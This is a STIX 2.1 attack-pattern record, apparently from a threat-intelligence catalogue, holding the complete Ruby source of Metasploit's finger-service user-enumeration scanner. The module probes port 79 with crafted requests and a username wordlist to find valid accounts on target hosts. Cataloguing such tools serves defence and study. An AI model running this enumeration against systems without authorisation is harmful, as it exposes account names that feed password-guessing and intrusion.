{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--52875e84-e3d6-4b11-bc2e-d69b0217d706",
    "created": "2024-08-14T16:26:36.099603Z",
    "modified": "2024-08-14T16:26:36.099606Z",
    "name": "Finger Service User Enumerator",
    "description": "Identify valid users through the finger service using a variety of tricks",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/finger/finger_users.rb",
            "external_id": "finger_users.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'Finger Service User Enumerator',\n      'Description' => 'Identify valid users through the finger service using a variety of tricks',\n      'Author'      => 'hdm',\n      'License'     => MSF_LICENSE\n    )\n    register_options([\n      Opt::RPORT(79),\n      OptString.new('USERS_FILE',\n        [ true, 'The file that contains a list of default UNIX accounts.',\n          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')\n        ]\n      )])\n  end\n\n  def run_host(ip)\n    @users = {}\n\n    begin\n      vprint_status \"#{rhost}:#{rport} - Sending empty finger request.\"\n      finger_empty\n      vprint_status \"#{rhost}:#{rport} - Sending test finger requests.\"\n      finger_zero\n      finger_dot\n      finger_chars\n      vprint_status \"#{rhost}:#{rport} - Sending finger request for #{finger_user_common.count} users\"\n      finger_list\n\n    rescue ::Rex::ConnectionError\n    rescue ::Exception => e\n      print_error(\"#{e} #{e.backtrace}\")\n    end\n    report_service(:host => rhost, :port => rport, :name => \"finger\")\n\n    if(@users.empty?)\n      print_status(\"#{ip}:#{rport} No users found.\")\n    else\n      print_good(\"#{ip}:#{rport} Users found: #{@users.keys.sort.join(\", \")}\")\n      report_note(\n        :host => rhost,\n        :port => rport,\n        :type => 'finger.users',\n        :data => {:users => @users.keys}\n      )\n    end\n  end\n\n\n  def finger_empty\n    connect\n    sock.put(\"\\r\\n\")\n    buff = finger_slurp_data\n    parse_users(buff)\n    disconnect\n  end\n\n  def finger_zero\n    connect\n    sock.put(\"0\\r\\n\")\n    buff = finger_slurp_data\n    parse_users(buff)\n    disconnect\n  end\n\n  def finger_dot\n    connect\n    sock.put(\".\\r\\n\")\n    buff = finger_slurp_data\n    parse_users(buff)\n    disconnect\n  end\n\n  def finger_chars\n    connect\n    sock.put(\"m m m m m m m m\\r\\n\")\n    buff = finger_slurp_data\n    if buff.scan(/\\r?\\nm\\s/).size > 7\n      @multiple_requests = true\n      vprint_status \"#{rhost}:#{rport} - Multiple users per request is okay.\"\n    end\n    parse_users(buff)\n    disconnect\n  end\n\n  def finger_list\n    if !@multiple_requests\n      finger_user_common.each do |user|\n        next if @users[user]\n        connect\n        vprint_status \"#{rhost}:#{rport} - Sending finger request for #{user}...\"\n        sock.put(\"#{user}\\r\\n\")\n        buff = finger_slurp_data\n        ret = parse_users(buff)\n        disconnect\n        break if not ret\n      end\n    else\n      while !finger_user_common.empty?\n        user_batch = []\n        while user_batch.size < 8 and !finger_user_common.empty?\n          new_user = finger_user_common.shift\n          next if @users.keys.include? new_user\n          user_batch << new_user\n        end\n        connect\n        vprint_status \"#{rhost}:#{rport} - Sending finger request for #{user_batch.join(\", \")}...\"\n        sock.put(\"#{user_batch.join(\" \")}\\r\\n\")\n        buff = finger_slurp_data\n        ret = parse_users(buff)\n        disconnect\n        break if not ret\n      end\n    end\n  end\n\n  def finger_slurp_data\n    buff = \"\"\n    begin\n      while(res = sock.get_once(-1, 5) || '')\n        buff << res\n        break if buff.length > (1024*1024)\n      end\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception\n    end\n    buff\n  end\n\n  def finger_user_common\n    if(! @common)\n      File.open(datastore['USERS_FILE'], \"rb\") do |fd|\n        data = fd.read(fd.stat.size)\n        @common = data.split(/\\n/).compact.uniq\n        @common.delete(\"\")\n      end\n    end\n    @common\n  end\n\n  def parse_users(buff)\n    buff.each_line do |line|\n      uid = nil\n      next if line.strip.empty?\n\n      # Ignore Cisco systems\n      return if line =~ /Line.*User.*Host.*Location/\n\n      next if line =~ /user not found/i\n      next if line =~ /no such user/i\n      next if line =~ /must provide username/\n      next if line =~ /real life: \\?\\?\\?/\n      next if line =~ /No one logged on/\n      next if line =~ /^Login\\s+Name\\s+TTY/\n\n      # print_status(\">> #{line}\")\n\n      # No such file or directory == valid user bad utmp\n\n\n      case line\n      when /^([a-z0-9\\.\\_]+)\\s+([^\\s]+)\\s+([^\\s]+)\\s+([^\\s]+)\\s+([^\\s]+)/\n        # Solaris\n        uid = $1\n        if ($2 != \"Name\")\n          @users[uid] ||= {}\n        end\n\n      when /^\\s*Login name:\\s*([^\\s]+)\\s+/i\n        # IRIX\n        uid = $1\n        @users[uid] ||= {} if uid\n      when /^\\s*(?:Username|Login):\\s*([^\\s]+)\\s+/i\n        # Debian GNU/Linux\n        uid = $1\n        @users[uid] ||= {} if uid\n      end\n\n      if uid\n        print_good \"#{rhost}:#{rport} - Found user: #{uid}\" unless @users[uid] == :reported\n        @users[uid] = :reported\n        next\n      end\n    end\n    return true\n  end\nend\n"
}